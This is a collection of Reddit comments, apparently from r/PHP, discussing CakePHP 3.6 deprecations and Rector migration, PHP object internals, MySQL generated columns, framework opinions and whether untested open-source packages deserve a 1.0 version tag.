There is a lot of deprecation in there. What is the point of things like this "Cake\Network\Exception\BadRequestException has been renamed to Cake\Http\Exception\BadRequestException." Is this for PSR compatibility or just because someone didn't like a name? I'm going to have to do a lot of find and replace to go to this.
To quote the [commit](https://github.com/cakephp/cakephp/commit/a53a14b0f7eaab8ca0c7ec050f5ca7b66473dce7) that did the rename: &gt; This will assist in making the Http package a subsplit, and also puts the exceptions in the same package as where they are frequently used.
This post can give some details, https://nikic.github.io/2015/06/19/Internal-value-representation-in-PHP-7-part-2.html
Which, specific, hardware key are you using? That may matter more for which algorithms you can use than what Oracle gives you in Java.
This belongs in a more generic subreddit like /r/programming
Could be, but the most popular PHP frame work, Laravel, make extensive use of the global state, so that is why I thought it belonged here. 
The link is broken, here‚Äôs the correct one: https://m.youtube.com/watch?v=-FRm3VPhseI
People still use CakePHP?
many actually :) 
I'm so glad I've never had to work under a technical dummy.
Many people, many companies and many applications. Maybe give it a go :)
Create a docker container for your web server, with a shared folder for your development. Then you just need to make sure that you commit between switching computers. VNC works too (with your desktop as the web server). I've done this before, and it works great, especially if your other computer is not as powerful.
Where I state something being a design choice of Laravel, you then say it seems to be accepted to be poor design, while you explicitly call on Laravel and then try to tell me you're not bashing on Laravel? No, you're not bashing on it. You're merely stating one of its foundation design choices (note choice) is bad design. What am I missing? Again, not an advocate of Laravel. And to get back to the essence, this post is way too broad to be specifically posted on a PHP subreddit. You may as well post it on a JavaScript forum and let me post Agile course videos on this one. Seems legit?
PHP is a dynamic language. That may seem "weird" if you have experience with C++ predominantly, but it's actually quite common: Python, Ruby, JavaScript, Lua, etc. That said PHP is closer to a static language than those above. There actually is a v-table, and there is a central property table. PHP is more efficient, when you don't add members dynamically. Adding members dynamically causes an additional associative array to be attached to every object, that backs those extra members. So if you stick to what's declared in the class, that's your best strategy.
Mounting gas tank in the rear of a car is bad design because it can explode when hit. Ford Pinto mounted gas tank in the rear of the car, thus implementing a bad design. Global state is considered bad practice [because](https://softwareengineering.stackexchange.com/questions/148108/why-is-global-state-so-evil). /u/yisraeldov says Laravel implemented global state, thus implementing a bad practice. I can't say for certain if this is true about Laravel. All I know about its "global state" are the facades that are hidden behind static factories. I have not bothered to dive deeper into it, so /u/yisraeldov may well not be true. But if they are - it's not really bashing, it's stating a common belief in programming.
What do you use? 
It seems to have all been fixed now.
So does symfony...
For anyone considering using Magento, I highly recommend you stop, look at yourself in the mirror, then punch yourself in the face. The shards of glass in your hand will be a better experience than using Magento.
I use CakePHP 2.x because it is backwards incompatible with CakePHP 3.x
Yay! Thanks for helping us out in the Kickstarter!
Where did the shards come from? #magentothings
Awesome.....What framework do you use? Express?
Yeah its used and they still do a yearly conference. I believe its definitely lost share to Laravel/Symfony. Cake 2 to 3 wasn't pleasant because no BC, but was necessary for it to remain modern.
How do you handle coding in that. I dabbled with puppeteer for a project where I thought it would be a good fit and the exceptions Node spits out were nonsense compared to other languages.
I should say, as an addendum, that I have a high opinion of Automattic. They're a well-organised remote-working company, and I reckon anyone who can get make F/OSS (a) install easily on shared hosting, and (b) make a viable business out of it, is doing something right. I am loathe to call people morons anyway, as someone is doing elsewhere in this post, especially since I don't know what technical constraints the devs are under. It'd be great to see Automattic employees blogging about sec issues, and posting in PHP places like here, but I don't think I've seen anything so far. It'd be a good way for them to change minds about WP `:-)` 
The line you highlighted isn't the one causing the error. Look at line 319
We use Koa
We didn't update to 2.4 yet (currently * 2.3.8 according to `composer info codeception/codeception`), but we're seeing other [strange issues in assertion tests](https://codeception.slack.com/files/U9J89M35K/F9KCTRT9R/screenshot_at_mar_06_12-49-03.png) suddenly popping up.
We've adopted a couple of projects recently with it, and I have to say it certainly wouldn't be my first or second or third choice. It's like it's trying to be a Laravel (super easy to use) but it just ends up feeling weird and dirty and _too_ magic
/r/phphelp will be able to provide support.
&gt; PHP is more efficient, when you don't add members dynamically. Absolutely, declared properties are accessed via a simple array like access (shift + indirection, O(1)). The property offset is resolved at compile time and stored in byte code as corresponding opcodes operand. For example, a direct access in ZEND_FETCH_OBJ_R opcode implementation https://github.com/php/php-src/blob/master/Zend/zend_vm_def.h#L1812
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [php/php-src/.../**zend_vm_def.h#L1812** (master ‚Üí 856b63a)](https://github.com/php/php-src/blob/856b63a632c90c0c23ac49b8e51d5e0b45cb0c4a/Zend/zend_vm_def.h#L1812) ---- [^delete](https://www.reddit.com/message/compose/?to=GitHubPermalinkBot&amp;subject=deletion&amp;message=Delete reply dva6yp1.)
The mobile version of this is pretty bad unfortunately 
Agree. We're early stage and focus on desktop as 90%+ of devs come from there. But will surely work on mobile in the coming weeks. Have you tried importing and analyzing your own repos, btw? Any feedback?
Hey, I was just interested in the laravel stats. I have all my repos on gitlab which is hosted on a raspberry pi3 (which pretty slow), would it be compatible? Will my work stay private?
And thatt just one class. To save you the frustration from changing 20 classes and 6 methods manually, use Rector prepared set instead. Here is [PR with CakePHP 3.6](https://github.com/rectorphp/rector/pull/346) How to run it over your code? # first run vendor/bin/rector process /app /src --level cakephp36 --dry-run # and apply vendor/bin/rector process /app /src --level cakephp36 What is `cakephp36` =&gt; `cakephp36.yml` in detail? services: Rector\Rector\Dynamic\MethodNameReplacerRector: $perClassOldToNewMethods: 'Cake\ORM\Table': 'association': 'getAssociation' 'Cake\Validation\ValidationSet': 'isPresenceRequired': 'requirePresence' 'isEmptyAllowed': 'allowEmpty' Rector\Rector\Dynamic\PropertyToMethodRector: $perClassPropertyToMethods: 'Cake\Controller\Controller': 'name': 'get': 'getName' 'set': 'setName' 'plugin': 'get': 'getPlugin' 'set': 'setPlugin' 'Cake\Form\Form': 'validator': 'get': 'getValidator' 'set': 'setValidator' Rector\Rector\Dynamic\ClassReplacerRector: $oldToNewClasses: 'Cake\Cache\Engine\ApcEngine': 'Cake\Cache\Engine\ApcuEngine' 'Cake\Network\Exception\BadRequestException': 'Cake\Http\Exception\BadRequestException' 'Cake\Network\Exception\ConflictException': 'Cake\Http\Exception\ConflictException' 'Cake\Network\Exception\ForbiddenException': 'Cake\Http\Exception\ForbiddenException' 'Cake\Network\Exception\GoneException': 'Cake\Http\Exception\GoneException' 'Cake\Network\Exception\HttpException': 'Cake\Http\Exception\HttpException' 'Cake\Network\Exception\InternalErrorException': 'Cake\Http\Exception\InternalErrorException' 'Cake\Network\Exception\InvalidCsrfTokenException': 'Cake\Http\Exception\InvalidCsrfTokenException' 'Cake\Network\Exception\MethodNotAllowedException': 'Cake\Http\Exception\MethodNotAllowedException' 'Cake\Network\Exception\NotAcceptableException': 'Cake\Http\Exception\NotAcceptableException' 'Cake\Network\Exception\NotFoundException': 'Cake\Http\Exception\NotFoundException' 'Cake\Network\Exception\NotImplementedException': 'Cake\Http\Exception\NotImplementedException' 'Cake\Network\Exception\ServiceUnavailableException': 'Cake\Http\Exception\ServiceUnavailableException' 'Cake\Network\Exception\UnauthorizedException': 'Cake\Http\Exception\UnauthorizedException' 'Cake\Network\Exception\UnavailableForLegalReasonsException': 'Cake\Http\Exception\UnavailableForLegalReasonsException' 'Cake\Network\Session': 'Cake\Http\Session' 'Cake\Network\Session\DatabaseSession': 'Cake\Http\Session\DatabaseSession' 'Cake\Network\Session\CacheSession': 'Cake\Http\Session\CacheSession' 'Cake\Network\CorsBuilder': 'Cake\Http\CorsBuilder' 'Cake\View\Widget\WidgetRegistry': 'Cake\View\Widget\WidgetLocator 
They are *hash tables* and use the same hash table implementation as PHP arrays do under the hood, but they're not the same
If your php version is *that old* then you probably have lots of other stuff riddled with security holes. I would recommend seeing if you can move it over to a modern environment. It might be easier. Of course it depends on how it is set up.
Inaugural longstar
I'm a bot, *bleep*, *bloop*. Someone has linked to this thread from another place on reddit: - [/r/phphelp] [Enter to win a free Longstar PHP (TX) conference ticket!](https://www.reddit.com/r/PHPhelp/comments/82il6y/enter_to_win_a_free_longstar_php_tx_conference/) &amp;nbsp;*^(If you follow any of the above links, please respect the rules of reddit and don't vote in the other threads.) ^\([Info](/r/TotesMessenger) ^/ ^[Contact](/message/compose?to=/r/TotesMessenger))*
Longhorn actually üòä
Check with Ian
That relates to the NBD engine. You can use them in innodb from MySQL 5.7.5
Ah, that fateful after-afterparty discussion at World...
More like they use shitty shared hosts instead of rolling instances for their customers and installing what they need.
üëç
Nope, that's exactly the 2 repos that are included in the analysis. https://github.com/laravel There are many submodules, so if you'd like to see all of them, you can go ahead and configure a project for yourself - it's free (as it is for all OS repos!) :D
Thanks for the advice. You're right, everything is old.
Oh boy, why the name Longhorn? That was the codename for Windows Vista...
Ha - we're in Austin, TX. Longhorns are our state mammal, and the mascot for the University of Texas (unaffiliated)!
Ah, gotcha! Hopefully all goes well and as planned (Unlike Vista, lol)
‚Ä¶why not? An object can contain arbitrary key/value pairs.
Usually, I'd be right there. This is a friend, and she knows she needs an overhaul but right now is just looking to fix the bugs and I generally tend not to take freelance dev jobs so I'm not really motivated to push her to make it a big project. 
Homework ! Hahaha
Although the question is written oddly - the answers are all right there - with some basic knowledge and googling.
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [alchemyguy/YoutubeLaravelApi/.../**LiveStreamService.php#L40** (master ‚Üí a3c0c62)](https://github.com/alchemyguy/YoutubeLaravelApi/blob/a3c0c6204fd5a5b2875ab0dda199b037f0c97a24/src/LiveStreamService.php#L40) ---- 
I hate seeing the word procedure in this context. Php doesn't use the word procedure.
This is fantastic feedback. üëçüèª
This code looks badly written, as if a junior developer wrote it, in some cases there are multiple if statements nested all with in a for loop and I am like - wait what?
Thanks for the feedback will look into this and see how I can improve it . I haven't added tests yet will be adding them soon. 
Method,function,within
Hearing a lot of good stuff about laracasts, but unfortunately there videos are region blocked I guess as I can't play even the free ones due to privacy settings.
Yes, that's what the hash table does
That's the exact same thing that I feel when trying to use Laravel. It's like it's trying to be CakePHP (super easy to use), but it just ends up feeling weird and dirty and _too_ magic
Glad to see something like this. I recently started learning Laravel and have recently been working with the YouTube API for a project in WordPress. Its tempting to put it out there like you did with your work but I don't think I could handle the feedback quite yet. Take the advice with a grain of salt, make some changes, and KEEP MAKING STUFF! Can't wait to try out your code once I get comfortable with Laravel :)
My suggestion was quite simple, but you don't seem to understand. step 1: rename all your counts into NewCount or something, which should point to a function you can write yourself. Renaming is something a tool can do for you, so that wouldn't take a lot of time. step 2: write that function, and improve the beef you have with count. This really doesn't have to take half an hour in total.
What do you recommend instead?
CakePhP was trying to be RoR long before Laravel came along and tried to be RoR...
Nobody cares who did it first, it's who did it best.
wordpress
Suggesting the OP adds 'required' to the input element does not answer the OP's question "How do I make a form field a different background color if the user doesn't provide the required field data........" so, my response is not overly critical. You simply misread the OP's question.
A little far away from Belgium unfortunately ;) 
Oh, I like it a lot. Looks way nicer than PHPFiddle. I will test it as soon as I can :)
I wonder why not use a parameter in the route for the slug, so it would be enough to have a single route handler, instead of setting up the same, but separate route handler for all the posts one-by-one? Not to mention that if you have a specific route handler for each post, why have another query to retrieve the same data in the handler that you already have? :) In summary: there should be a single route handler with parameter, no query before creating the route handlers and that foreach inside the handler is messy, either get the first or the last post for the given slug, but don't loop over them just to have one, and as a last one: don't create variables that won't be used. :)
When objects where added to PHP in v4, they were a thin wrapper around arrays and this probably explains the behaviors like iteration exist of the object. The current implementation of objects is much more optimized with declared properties being more efficient. For a long time it was just a simple array representing all the properties, declared or not. You should look at the PHP 4 src as well to find out about why they feel so much like arrays today. The external API is still backwards compatible, the implementation changed a lot.
I've opened an [issue on Github](https://github.com/squizlabs/PHP_CodeSniffer/issues/1926), in case anyone is interested in contributing some time to improving the documentation.
FYI, do not use xml or yml config with api platform, not everything you can do with the annotations works, I found out after fucking about for way too long.
Got any examples of what won't work with yaml? Just switched over to the yaml notation as it's way easier to read than a bulky list of annotations.
urgh, I'm so triggered by the docblocks... /** * Class DeviceMobile */ class MobileDevice Such useless comments, I wish PHPStorm would just remove them already from the default templates. Please encourage everybody to remove this manually. /** * MobileDevice constructor. * @param string $deviceId */ public function __construct(string $deviceId) you are using type hints, no need for repeating yourself in a docblock. Also, commenting this is a constructor? how else would I know, amirite? /** * MobileDevice constructor. * @param string $deviceId * @param \DateTime $installationDate */ public function __construct(string $deviceId, \DateTime $installationDate, string $userAgent) exactly why these trigger me, they are often not updated, and as seen here are out of date, so even less than useless: just plain wrong. What I see a lot as well is a class is renamed, but those useless comments are not updated, so they are incorrect as well. Please do not add comments just to have a comment. if it adds zero information, just remove it. /rant
maxDepth for route generation is an important example
Rewrite to PHP 7. If its using 4.3.8 it probably has many other problems besides the PHP version. Stepping up bit by bit is too much work IMO.
&gt; becomes unified to "client manager services" Why? None of the examples have the "manager" as the middle word. 
I feel you. I have the same approach to this. Luckily, there is coding standard fixer for that: https://github.com/Symplify/CodingStandard/blob/master/README.md#block-comment-should-only-contain-useful-information-about-types Cleans the docblock from useless stuffs and leaves the peace for eyes
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [Symplify/CodingStandard/.../**README.md#block-comment-should-only-contain-useful-information-about-types** (master ‚Üí 2eb2e6d)](https://github.com/Symplify/CodingStandard/blob/2eb2e6d04b57a6949e47a247ea33da623fee074a/README.md#block-comment-should-only-contain-useful-information-about-types) ---- [^delete](https://www.reddit.com/message/compose/?to=GitHubPermalinkBot&amp;subject=deletion&amp;message=Delete reply dvbhbyx.)
Thanks! I think it does matter how f things are abandoned. Off the top of my head: 1) Laravel developers are a dime a dozen; 2) they‚Äôre missing out on 15 years of security and speed improvements; and 3) a lack of support &amp; documentation means they have to pay me more to figure out what‚Äôs going on. Even for a simple bug fix. Their old developer bailed on them and left them in a lurch. It‚Äôs written like it was 2003, no source control, backup folders littered everywhere. All these folders with random dates appended. Gah. Sorry. /rant 
people still use that garbage framework? All those stupid "baking" metaphors and the dead slowness turned me right off. whatyearisit.meme
I agree ... but I think the point of the tutorials the logic behind not the details (as long as work)
Well, what is a hash table if not an associative array? I don't understand the distinction you're trying to make.
Trolling much? 
Yeah I *must* be trolling. It couldn't possibly be that cakePHP is an absolute shit framework, could it?
Once again, a post that says nothing and brings no added value to the internet.
thanks for code review, i will delete unuseful comments :) 
Okay, documentation seemed to imply that its only for the NBD engine. I can not find a clear information which engines in which version support generated columns. Also, would your example really work? According to the docs: &gt; Generated column expressions must adhere to the following rules. An error occurs if an expression contains disallowed constructs. Literals, deterministic built-in functions, and operators are permitted. A function is deterministic if, given the same data in tables, multiple invocations produce the same result, independently of the connected user. Examples of functions that fail this definition: CONNECTION_ID(), CURRENT_USER(), *NOW()*.
&gt; Also, would your example really work Clearly not! mysql&gt; ALTER TABLE users ADD is_expired bool GENERATED ALWAYS AS (NOW() &gt; expiration) VIRTUAL; ERROR 3102 (HY000): Expression of generated column 'is_expired' contains a disallowed function. I was hoping that'd be allowed for any column that was altered. A view would be the way to go in this example, but obviously at the cost of creating the view/querying the view over it being another column in the DB. Ah well, one can hope for non-deterministic dynamic generated columns... 
I agree with you about Laravel. Personally I think Rails hits the sweet spot magic-wise. It does a lot of the grunt work without hopelessly obscuring what‚Äôs actually happening.
I've always seen phpunit as a dev requirement so --no-dev would leave you without it, but assuming phpunit is available even with --no-dev then why not do both? have a step in your CI that runs with dev requirements, then another that does it without dev requirements.
It's the part of fingerprint algorithm. One of the steps is to sort it alphabetically. The idea behind it is to have unified sequence so above mentioned names belong to the same cluster. Otherwise you'll create 3+ clusters. Have a look at [description](https://github.com/vladan-me/fingerprint#fingerprint) and also [original algorithm](https://github.com/OpenRefine/OpenRefine/wiki/Clustering-In-Depth#fingerprint). Finally, it makes a lot of sense once you start using it on real examples.
If you use the phar, all code in the phar also becomes available to the code running. So you still have the same problem. It's kinda a problem for tools that _execute_ your code. 
Guess I'm using the search box incorrectly &gt; use the following search parameters to narrow your results: subreddit:subreddit find submissions in "subreddit" author:username find submissions by "username" site:example.com find submissions from "example.com" url:text search for "text" in url selftext:text search for "text" in self post contents self:yes (or self:no) include (or exclude) self posts nsfw:yes (or nsfw:no) include (or exclude) results marked as NSFW
I would fix the formatting on the code examples, makes it look both unprofessional and hard to follow along with.
wordpress with woocommerce is 1000 times better than magento and from a developer viewpoint wordpress is fucking amazing, you can modify and tweak everything and anything, even overriding other plugin behavior, through plugins and themes/child themes. And writing a plugin for wordpress takes 30 seconds to have a working stub, compared to the 30 minutes it takes for magento to have a stub that doesn't show up in the back end and the extra 4 hours it takes to find the one missed capitalization that fucked the whole thing up.
Thanks, I'm happy to share! Feel free to create issue with link to upgrade.md, if you need some other versions. This is just list for this version I made in 10 minutes.
It doesn't search comments
I'm not really sure what you mean, but I don't think it really answers the question. The point I was trying to make is that i'd rather run any tests (unit, static analysis, etc) with the code close to what I run in production. As @willemmollie said, if you run phpunit you at least have that code available, so you can't easily avoid that, but i'm not aiming to avoid that. I'm aiming to avoid all other dev requirements
because it is typical, poorly designed and poorly written Magento module
I can‚Äôt stand looking at magento 
There could be many reasons, but I think there might be one that is more common. Many projects released today are using Composer to manage dependencies. Not marking a project as stable, by tagging it as 1.0, complicates the process of using it. If a beginner owns the project, they might find it easier to tag a release without regard to its actual stability and without understanding how semantic versioning works.
It‚Äôs the main reason people think is a load of shit
Well that's a shame; I have a hatred of annotations and avoid them whenever possible. I think my only consistent use of them right now is when marking PHPUnit tests with /** @test */ instead of prefixing function names with 'test' (which drives me even more nuts, especially when I need annotations anyway to denote a data provider or something)
nothing to add
What do you want ? A test directory ? X% code coverage ? N assertion(s) per code path ? A repository which satisfies all of these constraints can still be 0% tested. This is impossible to quantitatively certified a piece of software as tested. I've recently encountered several production down times with one of the 2s most popular PHP frameworks due to several regressions (obviously) uncovered by tests. So do not forget to track something like regression rate. 
I'm with you. Even my 0.1 releases have good tests and a well written readme. No unit tests/docs are fine for the discovery/hacking phase, once you publish anything to GitHub it should have some tests and a decent readme.
I'm not a fan of reddit's search. It's been improved in recent years, but not enough. Google still works well though: https://www.google.com/search?q=Flight+site%3Areddit.com+inurl%3A%2Fr%2Fphp%2FComments%2F Your mention comes up on the third page of results (for me at least)
Something weird going on as laravel 5.6 had way way higher numbers. I suspect something is wrong for the 5.4 bench.
Yup
THen my question is why are you tagging it, why are you advertising it and why are you not researching how to properly tag projects because you can tag pre-release software in composer
Because it's easy and it allows you to use it yourself. That's fine imho. Many services are free if the code is public, so having many shitty 1.0 projects is inevitable. If I want to use 3rd party code it's *my* responsibility to check the code quality, how good it is tested, how big the community is etc. With that said if I don't see a test-folder in the project it's a 98% chance that I don't use it and 99.999% chance that I wont contribute.
What if the code is well written but the community is non existent? Getting a community to grow around a project is like winning the lottery, it‚Äôs a popularity contest (or a tax on the poor in the lottery sense)
Depends on their target audience. Which is usually themselves. 
My complaint was more towards those who advertise their projects to the community as finished projects
Because they are beginners and don't know better or even realize that marking something 1.0 has meaning?
Laravel, Composer and Beginners. AKA: The 21st century phpPlague.
If you look at the rules for something like semantic versioning (https://semver.org/), they can get somewhat complex. Guessing that's part of issue here as well. People not following a spec like that as they manage version numbers. 
&gt;in the PHP community Bruh, when was the last time you were a part of any other programming language community? Releasing untested, unstable software as 1.0 is standard for inexperienced developers. This was the norm even when I was diddling with VB6 and Delphi.
Everybody starts with one star at github‚Ä¶ If there's no community I'll ask questions: - Are there test cases? - Is there a readme? - Are there docs? - Is a license specified? - Does the project communicate code-quality (travis, scrutinizer, ‚Ä¶)? - Does the project offer additional community channels (IRC, Slack, ‚Ä¶) even if not active at the moment? - How many other projects depend on that project (composer/packagist)? - How old is the project? How old is the problem the project solves? Was it maintained over a longer period? - How big is the problem the project solves? How big of a commitment is it to use that project. How important is awesome-code vs. long-term-stability to me? - How many people contribute so far. What's the bus-factor? - Are there issues or pull-requests. How old are they? - What's the competition to solving that problem? See, just answers those questions and the answer should be easy. ü§™ 
Well aren't you demanding for someone who's receiving free software. &gt;"Well it works in such and such project" or "I tested it in the browser" or some other ludicrous example. What is ludicrous about that? &gt;IMO: It makes you look unprofessional when you have 0 tests for an open source 1.0 release of some PHP (never mind the language) project. &gt;And don't get me started on documentation and poorly put together Readmes. It's open-source, why don't you contribute.
Everyone has to start somewhere.
You should have a look at Node modules (npmjs). This community is even worse. It seems like JavaScript developers never heard of [SemVer](https://semver.org/). PHP community is really doing a good job.
it generally means this is stable, usable software when its "not" in some cases.
Did you pay for that software? No? Then I feel you have no right to complain about it since it's shared "as is" and you choose to use it. Otherwise contact your seller and ask for tested one :) OSS creators spend their free time to bring us useful tools, for free, no strings attached, and it's a shame to whine and complain how untested or undocumented it is. You lack tests? Create a PR for them. Lacking some info on docs? Find it out and create a PR for that! OSS creators tag their software as they see fit, and it applies to more than just PHP community, same happens in other language communities too, and there's nothing bad about it.
*I* understand. Re-read the thread.
&gt; You should have a look at Node modules (npmjs). This community is even worse. Not that I disagree, but "better than the NPM community" is a pretty low bar.
What's your use case not adding anything related to the question?
Sometimes when asking how to do something there are better solutions than the one asked how to do. It's not uncommon that it is easier to be helpful if one knows why someone wants to do something, not just how. https://en.wikipedia.org/wiki/XY_problem
**XY problem** The XY problem is a communication problem often found in help desk or similar situations, the cause of a problem is masked because the person asking for help has presented incomplete information as to the source of their problem. This ambiguity in the real source of a problem leads to wrong, inaccurate, or unhelpful solutions being offered. The issue arises when the person with the problem thinks that they themselves have a partial solution to their problem, and only ask for the parts they think they are "stuck" on. On the other side, the people offering to help lack information as to the root problem, and thus cannot provide ultimately useful information. *** ^[ [^PM](https://www.reddit.com/message/compose?to=kittens_from_space) ^| [^Exclude ^me](https://reddit.com/message/compose?to=WikiTextBot&amp;message=Excludeme&amp;subject=Excludeme) ^| [^Exclude ^from ^subreddit](https://np.reddit.com/r/PHP/about/banned) ^| [^FAQ ^/ ^Information](https://np.reddit.com/r/WikiTextBot/wiki/index) ^| [^Source](https://github.com/kittenswolf/WikiTextBot) ^| [^Donate](https://www.reddit.com/r/WikiTextBot/wiki/donate) ^] ^Downvote ^to ^remove ^| ^v0.28
Looks great, we have really thank the Paragon Initiative for being so good at both security and PHP :)
I've always found it helpful to answer the question being asked. http://www.mentalhealthamerica.net/conditions/personality-disorder
They're inexperienced. There's nothing stopping them from doing it. We vote with our stars and `composer install`s.
Docker is the answer. And make sure you are able to ssh to your work machine, this will help in cases where you need to commit something that you have forgotten, or clone a git repo or branch over without pushing it to "remote".
&gt;you choose to use it. Actually OP didn't imply any usage, it sounds far more like OP was just going through some potential options and found quite a few things marked as '1.0' (which would generally be taken to mean feature-complete and deliverable, which would in turn generally imply at least basic testing and all that) which had a more '0.1' quality (which would generally be taken to mean either or both of not feature complete or in need of a lot of surrounding work to test/document/etc. before being considered a 'full' thing.) OP never complained about people releasing anything, only releasing it under a dubious version. &gt;OSS creators tag their software as they see fit, and it applies to more than just PHP community, same happens in other language communities too, and there's nothing bad about it. Well it is just opinion, but I think trying to enforce a standard meaning to '1.0' as full-release, and enforce a standard of 'full-release' implying not only functionality but at least basic testing+docs is reasonable.
Yeeeeeah, I tried all this and I'm sitting at gitlab with 3 stars on a fairly decent try at standartizing rxjs and socket.io :) but hey, _I_ feel accomplished and didn't tag it as 1.0 ;D
Semantic versioning have nothing to do with testing. You can definitely have a project where the public API is stable enough for 1.0 without having tests. Abd if you are wrong and the API changes, just increment the major version. 
Fair enough! I read OP as kinda of complaint, and saw too many of similar posts that just blame OSS for not doing thing the right way. Interesting idea about the standard, but in a way that would limit how much choice we have as devs in general IMO, sometimes it's ok to take a risk and go with not so stable package.
&gt;Everybody starts with one star at github [üôÅ](https://github.com/MattSandy/wspr)
TANSTAAFL!
Post your github to demonstrate how it should be done please. ;)
Good projects tend to do well. If you've written a useful thing that solves a problem, and you executed it well, there's a good chance it will become successful.
Several reasons. - It's their project, so they get to decide how it's versioned - It's their project, so they get to decide when it's deemed release or pre-release - They don't care
Ultimately, the owner of the project gets to decide when it's stable and usable. 1.0 seems like a perfectly sensible starting place.
A lot of "require-dev" dependencies are optional integrations that arent required by the package, but if they are there, the package has additional features. As such, those optional dependencies are listed in 'require-dev' because you have tests that prove the optional integrations work, so theres a lot of require-dev dependencies that you *must have* in order to run your tests. So I dont see how you can really ensure that you're not accidentally relying on a dev package. 
Is demo, beta, 0.5 version (= 50 % works?), something to be used safely? Or rather final, stable, 1.0 version. I think it's just matter of natural language. Semantic versioning != versioning as we human percieve it.
A PHP array is nothing but a hash table. A peculiar kind thereof perhaps (ordered string/key to arbitrary value map), but that's it. A PHP object is an associative array with an associated class. It does do more things than a plain associative array, but it still is one.
thanks for letting me know ;) already in the progress of migrating to paseto...was not that hard...
You'd probably be shocked at the amount of mature, stable and well regarded software you used every single day is actually untested.
Second this. 
Why are you going to create your own LMS? This post really suggests that you don't have the prerequisite knowledge to get something so complex up and working in a reasonable amount of time. Not trying to be a jerk, just providing a reality check... 
Thank you for the comments! We have a strong PHP team who are already working on YII framework. We are fast growing company where we can't continue with free LMS like Moodle since it has lot of limitations where our customers are not happy with that. That's why we are planning to build our own LMS. We are confident that we will be able to build on our own. Infact we have built our own internal application using Yii. which has lot of modules and permissions. I completely understand your concern, we have to build on our own what ever the cost :).
It's FOSS, just fork it and rename it and call it V0.0001 until there is 100% code coverage and then you can consider V0.01
are you my ex-wife?
Why does this post get downvoted so heavily and some, imo, pretty non-sense answers upvoted a lot? I mean, basically, the point the OP is making, is true. Sure, it's open-source, it's free software, probably nobody has been paid to create it, but I also don't really understand why people release untested packages. And yes, some commenters also said that the package creators are beginners and don't know about it, etc.; but then this post should be upvoted and not downvoted, so every beginner can read it and maybe learn more about tests or how to release a proper package. Even though it's free and open-source, there's absolutely no need that it's a low-quality code.
It's because the way OP pit his words together sounds like he's complaining about the free software he's getting. See the free beer is not cold comment above. _Every_ package you write should ideally have tests. If you are being paid to do some work, it's then your job to write tests. For open source, you have to understand not everyone is willing to put time for that. If those projects are not up to your standards, you can simply not use it, or put together a PR to add them. If you want to educate the mass community, you shouldn't be ranting about it but write informative and simply blog posts, videos, etc. 
Just because a project doesn't have automated tests doesn't make it untested. You're making some really bad assumptions here. And, not to belabor the point, but the flip-side is equally (if not more) true: just because a project has automated tests doesn't make it adequately tested. Bad tests can be worse than no tests.
Thank you. This is everything I needed to know about magento
Feel free to add tests to any of my projects and submit a pull request. 1.0 is for API stability for me, not your arbitrary testing requirement.
How can your dev and production code not exactly the same? I always run unit test againts my production code, even in ‚Äîdev installation 
This. People don‚Äôt want to be told the truth people want to live in there dillusional world
It's really fascinating to watch just how many down votes this and **EVERY COMMENT** I placed, got. It baffles me that we can't have both open and "free" software without also having quality written software. Why can't the two go hand in hand? Why is it we don't (seem to) care about writing quality software? We go to work 9-5, 5-7 days a week (depending on your job) and write the best we can software, some companies have strict and standard rules and others are lax. I get if you are working on a project, a proof of concept you might place something on github and ask for comments and ideas. How ever to release what most consider (at 1.0) stable software that is neither stable or tested and has either shotty documentation or badly written code and (as stated) no tests makes me wonder what kind of software developer you claim to be regardless of education and work experience I understand there are a lot of new people out there writing software and not understanding composer, semver, testing and so on - but to release something, regardless of the language with out first seeing: - What do other projects do? (big or small) - Whats the appropriate way to share a project? including tests, versioning, dependencies and so on - How are other people writing in this language, ie: camelCase, snake_case or even UPPERCASE - How many nested if,for, while loops is appopriate - How is documentation being done? - Whats the best way to write a readme - What are the current best practices at this time for this library, framework, package, language, ecosystem - and so on ... this to me shows plain and utter ignorance. It's one thing, as stated to share a project that's in the early stages, but to release a half baked cake and call it a wedding cake is downright foolishness To then come back to me and say: Well it's my first project - no that's an excuse considering the mountains of resources out there on basic testing, documentation and open source release "Etiquette" that we have in this day an age. Forget the hobby software of the 80's and early to late 90's we have advanced in what we expect from a typical open source project as some here have stated. Is it too much to ask for tests? Is it too much to ask for basic code quality in a "1.0 release"? I don't think so, but a lot of you, especially those who have now come to dislike me in this php community believe so. You believe that "php is a crappy language so why bother" - I will tell you why - because to spread bad code through the community as so many have done for years and years now only brings the language more hate, more animosity from other languages especially those like rails (both language (ruby) and framework) and the .net community who think their projects are vastly superior to PHP (maybe in complexity). What bothers me the most is how we can shit on laravel - but when some one brings up the concept of cleaner, more tested, better documented Open source projects in PHP, never mind the countless other languages I get shit on. So what do we want guys? More crappy code spewed out by "beginners" as you label them, or take the time to produce better quality OS projects that don't just depend on stars on github to get attention?
Exactly. Another layer seems to have been added for no good reason. If the site only consists of a few pages the template directory need only contain style.css, index.php and functions.php.
Dude you are way too pompous. People like you steer developers away from PHP.
Sonarqube is a rather heavy weight alternative, but very nice none the less. We use both in my workplace as part of the build pipeline.
makes a difference especially if you have long running scripts. those will definitely get a speed up.
How do you sell ‚Äúthe business value‚Äù of backend development to get new project clients. Most companies will have a need but you can‚Äôt cold call a company owner and say ‚Äúwould you like some php development‚Äù and get good interesting work. Normal people don‚Äôt think in code needs. Trying to improve my own sales as I find after asking them if they have problems I keep talking about marketing and SEO and things that are not really business needs that dev solves. 
But I don't see where the OP is ranting really. He just wrote his thoughts down. He doesn't insult anyone, nor does he overuse exclamation marks, etc. Sorry, but I don't really see what's wrong with his post. He's just expressing his opinion and I don't think that should be downvoted so heavily. And a post here is also a good way to at least start the things - no need to make a video or blog post for every single thought. Moreover, I don't think testing is about having time to write the tests or not - if you reached a certain level of skills, writing tests is just normal. You'd never write code or publish software without writing tests for it. I can't see that it's about having time or not. And, sorry if it sounds harsh, but imo, if someone has no time to write tests for his source code, he should better not write software at all and better not publish it at all.
Unfortunately, it seems so, yes. Just because it's Open Source software, does definitely not mean the source code has to be of a low standard and users cannot expect some good code in it. Sure, basically it's side projects and / or hobbies for the people taking part in the open source project, but still everyone can expect some standards, no matter if it's paid or open source.
